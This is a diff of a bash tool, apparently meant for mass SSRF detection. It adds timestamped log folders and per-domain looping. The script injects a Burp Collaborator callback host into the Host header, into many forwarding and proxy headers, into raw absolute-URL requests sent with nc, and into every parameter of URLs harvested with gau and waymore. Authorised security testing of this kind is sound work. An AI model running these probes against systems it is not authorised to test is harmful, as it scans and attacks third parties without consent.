@@ -31,6 +31,9 @@ print_intro() {
 # intro function
 print_intro
 
+# Store resulsts in dir
+log_time=$(date +"%H:%M:%S")
+mkdir log_$log_time
 
 # Function to inject Host header
 inject_host_header() {
@@ -51,7 +54,7 @@ inject_host_header() {
     # Send the HTTP GET request using curl (background) with additional headers
     curl $domain -m 10 -H "Host: h--$UD.$Collab" &> /dev/null &
     # Print the processed domain for reference
-    echo -e "${light_blue}[$counter/$total_urls] ${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a inject_host_header.log
+    echo -e "${light_blue}[$counter/$total_urls] ${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a ./log_$log_time/inject_host_header.log
     # Wait for $Delay seconds before next iteration
     sleep $delay
   done < "$list"
@@ -77,7 +80,7 @@ inject_common_headers() {
     # Send the HTTP GET request using curl (background) with additional headers
     curl $domain/test -m 10 -H "From: root@From--$UD.$Collab" -H "User-Agent: Mozilla/5.0 root@User-Agent--$UD.$Collab" -H "Referer: http://Referer--$UD.$Collab/ref" -H "X-Original-URL: http://X-Original-URL--$UD.$Collab/" -H "X-Wap-Profile: http://X-Wap-Profile--$UD.$Collab/wap.xml" -H "Profile: http://Profile--$UD.$Collab/wap.xml" -H "X-Arbitrary: http://X-Arbitrary--$UD.$Collab/" -H "X-HTTP-DestinationURL: http://X-HTTP-DestinationURL--$UD.$Collab/" -H "X-Forwarded-Proto: http://X-Forwarded-Proto--$UD.$Collab/" -H "Origin: http://Origin--$UD.$Collab/" -H "X-Forwarded-Host: X-Forwarded-Host--$UD.$Collab" -H "X-Host: X-Host--$UD.$Collab" -H "Proxy-Host: Proxy-Host--$UD.$Collab" -H "Destination: Destination--$UD.$Collab" -H "Proxy: http://Proxy--$UD.$Collab/" -H "X-Forwarded-For: X-Forwarded-For--$UD.$Collab" -H "Contact: root@Contact--$UD.$Collab" -H "Forwarded: for=Forwardedfor--$UD.$Collab;by=Forwardedby--$UD.$Collab;host=Forwardedhost--$UD.$Collab" -H "X-Client-IP: X-Client-IP--$UD.$Collab" -H "Client-IP: Client-IP--$UD.$Collab" -H "True-Client-IP: True-Client-IP--$UD.$Collab" -H "CF-Connecting_IP: CF-Connecting-IP--$UD.$Collab" -H "X-Originating-IP: X-Originating-IP--$UD.$Collab" -H "X-Real-IP: X-Real-IP--$UD.$Collab" &> /dev/null &    
     # Print the processed domain for reference
-    echo -e "${light_blue}[$counter/$total_urls] ${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a inject_common_headers.log
+    echo -e "${light_blue}[$counter/$total_urls] ${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a ./log_$log_time/inject_common_headers.log
     # Wait for $Delay seconds before next iteration
     sleep $delay
   done < "$list"
@@ -104,7 +107,7 @@ inject_absolute_url() {
     # Send the row HTTP GET request using nc (background)
     echo -e "GET http://a--$UD.$Collab/ HTTP/1.1\r\nHost: $U_Domain\r\n" | timeout 5 nc -q 1 $U_Domain 80  &> /dev/null &
     echo -e "GET http://a--$UD.$Collab/ HTTP/2\r\nHost: $U_Domain\r\n" | timeout 5 nc -q 1 $U_Domain 443 &> /dev/null &
-    echo -e "${light_blue}[$counter/$total_urls] ${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a inject_absolute_url.log
+    echo -e "${light_blue}[$counter/$total_urls] ${YELLOW}$current_time ${NC}- Sent request to: $domain" | tee -a ./log_$log_time/inject_absolute_url.log
     # Wait for $Delay seconds before next iteration
     sleep $delay
   done < "$list"
@@ -114,55 +117,58 @@ inject_absolute_url() {
 # Function to handle the "-e" option
 handle_e_option() {
   cat $list | awk -F'[://" ]+' '{print $2}' | sort -u > domains.txt
-  main_Domain=$(grep -o '[^./]*\.[^./]*$' domains.txt | sort -u)
+  grep -o '[^./]*\.[^./]*$' domains.txt | sort -u > ./log_$log_time/main_Domains.txt
   rm domains.txt
   # Call the main function
-  inject_url_parameters "$main_Domain"
+  inject_url_parameters
 }
 
 # Function to gather URLs and inject into parameters
 inject_url_parameters() {
-  echo -e "${light_blue}[*] Gathering URLs from $main_Domain...${NC}"
-  printf $main_Domain | gau --subs --o gau.output --blacklist ttf,woff,svg,png,gif,jpeg,css,js && echo -e "${GREEN}[*] Extracted URLs from gau${NC}"
-  waymore -i $main_Domain -mode U -oU waymore.output -nd > /dev/null && echo -e "${GREEN}[*] Extracted URLs from waymore${NC}"
-  cat gau.output waymore.output | uro > all_urls.log
-  rm gau.output waymore.output
-  cat all_urls.log | grep -o '.*\?.*=.*' > all_params
-  cat all_params | uro -b jpg png js pdf css jpeg gif svg ttf woff > filtered_params.txt && echo -e "${GREEN}[*]Collecting Parms ${YELLOW}finished${NC}"
-  echo "">>filtered_params.txt
-
-  echo -e "${light_blue}[*] injecting Burp Collaborator into parameters...${NC}"
-  counter=0
-  total_urls=$(wc -l < "filtered_params.txt")
-  # Loop through each URL in the file
-  while IFS= read -r url; do
-  # Skip empty lines
-  if [[ -z "$url" ]]; then
-    continue
-  fi
-  # Extract parameters and inject separately
-  IFS='&' read -r -a params <<< "$(echo "$url" | grep -oP '(?<=\?).*')"
-  UD=$(echo "$url" | awk -F'[://" ]+' '{print $2}'| tr . -)
-  # Base URL without parameters
-  base_url=$(echo "$url" | grep -oP '^[^?]+')
-  p=0
-  counter=$((counter + 1))
-  # Loop through each parameter
-  for param in "${params[@]}"; do
-    # Extract key and value
-    key=$(echo "$param" | cut -d'=' -f1)
-    value=$(echo "$param" | cut -d'=' -f2)
-    current_time=$(date +"%H:%M:%S")
-    p=$((p + 1))
-    # Construct new URL with the parameter injected
-    new_url="$base_url?$(echo "$url" | grep -oP '(?<=\?).*' | sed "s|$key=$value|$key=http://p--$UD.$Collab/?vulnerable_url=$base_url%26vulnerable_param=$key%26time=$current_time|")"
-    # Send the request
-    curl -L $new_url -m 10 &> /dev/null &
-    echo -e "${light_blue}[$counter/$total_urls](p$p) ${YELLOW}$current_time ${NC}- Sent request to: $new_url" | tee -a inject_url_parameters.log
-    sleep $delay
-  done
-  done < "filtered_params.txt"
-  echo -e "${GREEN}✅ Injecting Burp Collaborator into parameters ${YELLOW}Finished ${NC}"
+  while IFS= read -r main_Domain; do
+    echo -e "${light_blue}[*] Gathering URLs from $main_Domain...${NC}"
+    printf $main_Domain | gau --subs --o gau.output --blacklist ttf,woff,svg,png,gif,jpeg,css,js && echo -e "${GREEN}[*] Extracted URLs from gau${NC}"
+    waymore -i $main_Domain -mode U -oU waymore.output -nd > /dev/null && echo -e "${GREEN}[*] Extracted URLs from waymore${NC}"
+    cat gau.output waymore.output | uro > all_urls.log
+    rm gau.output waymore.output
+    cat all_urls.log | grep -o '.*\?.*=.*' > all_params
+    cat all_params | uro -b jpg png js pdf css jpeg gif svg ttf woff > filtered_params.txt && echo -e "${GREEN}[*]Collecting Parms ${YELLOW}finished${NC}"
+    echo "">>filtered_params.txt
+    mkdir ./log_$log_time/0dSSRF_$main_Domain
+    mv all_urls.log all_params filtered_params.txt ./log_$log_time/0dSSRF_$main_Domain/
+    echo -e "${light_blue}[*] injecting Burp Collaborator into parameters...${NC}"
+    counter=0
+    total_urls=$(wc -l < "./log_$log_time/0dSSRF_$main_Domain/filtered_params.txt")
+    # Loop through each URL in the file
+    while IFS= read -r url; do
+    # Skip empty lines
+    if [[ -z "$url" ]]; then
+      continue
+    fi
+    # Extract parameters and inject separately
+    IFS='&' read -r -a params <<< "$(echo "$url" | grep -oP '(?<=\?).*')"
+    UD=$(echo "$url" | awk -F'[://" ]+' '{print $2}'| tr . -)
+    # Base URL without parameters
+    base_url=$(echo "$url" | grep -oP '^[^?]+')
+    p=0
+    counter=$((counter + 1))
+    # Loop through each parameter
+    for param in "${params[@]}"; do
+      # Extract key and value
+      key=$(echo "$param" | cut -d'=' -f1)
+      value=$(echo "$param" | cut -d'=' -f2)
+      current_time=$(date +"%H:%M:%S")
+      p=$((p + 1))
+      # Construct new URL with the parameter injected
+      new_url="$base_url?$(echo "$url" | grep -oP '(?<=\?).*' | sed "s|$key=$value|$key=http://p--$UD.$Collab/?vulnerable_url=$base_url%26vulnerable_param=$key%26time=$current_time|")"
+      # Send the request
+      curl -L $new_url -m 10 &> /dev/null &
+      echo -e "${light_blue}[$counter/$total_urls](p$p) ${YELLOW}$current_time ${NC}- Sent request to: $new_url" | tee -a ./log_$log_time/inject_url_parameters.log
+      sleep $delay
+    done
+    done < "./log_$log_time/0dSSRF_$main_Domain/filtered_params.txt"
+    echo -e "${GREEN}✅ Injecting Burp Collaborator into parameters on $main_Domain ${YELLOW}Finished ${NC}"
+  done < "./log_$log_time/main_Domains.txt"
 }
 
 # Parse command-line options
